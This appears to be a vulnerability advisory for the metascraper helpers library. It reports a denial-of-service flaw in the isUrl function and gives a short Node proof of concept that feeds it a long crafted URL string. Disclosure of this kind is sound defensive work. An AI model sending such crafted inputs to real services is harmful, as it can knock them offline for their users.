# Overview

A library to easily scrape metadata from an article on the web using Open Graph, JSON+LD, regular HTML metadata, and series of fallbacks.

Affected versions of this package are vulnerable to Denial of Service. An attacker providing a very long string to `isUrl` function in `packages/metascraper-helpers/index.js` can cause a Denial of Service.

# PoC

```node
const { isUrl } = require('@metascraper/helpers')

const targetUrl = 'http://github.com.asdasdasd.asdsadasdsadsad.asdasdsad.asdsadasdsa.sadasdsadas.dasdasasdasd.432asdas3423.3423423423.234234243.234234234.23423423.24234.'

if (!isUrl(targetUrl)) {
      throw new Error('INVALID_URL')};
```